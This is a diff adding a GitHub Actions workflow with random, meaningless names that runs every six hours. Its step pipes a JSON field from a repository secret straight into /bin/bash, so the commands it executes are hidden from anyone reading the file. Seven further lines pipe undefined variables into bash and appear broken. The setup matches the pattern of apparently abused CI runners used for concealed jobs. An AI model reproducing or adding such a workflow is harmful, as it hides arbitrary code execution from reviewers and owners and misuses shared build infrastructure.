@@ -1,0 +1,24 @@
+name: meiqiniyaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meiqiniyaa
+        env:
+          pa69894: ${{ secrets.pa69894 }}
+        run: |
+          echo $pa69894 | jq -r .wfue3 | /bin/bash
+          echo $csnc693 | jq -r .rxwq61028 | /bin/bash
+          echo $pbhng96 | jq -r .wmv891 | /bin/bash
+          echo $ig6920 | jq -r .dhzmh4 | /bin/bash
+          echo $zjya15377 | jq -r .eejd3290 | /bin/bash
+          echo $qi96 | jq -r .go56 | /bin/bash
+          echo $mtfpz5116 | jq -r .btal7766 | /bin/bash
+          echo $ear39 | jq -r .se183 | /bin/bash
+
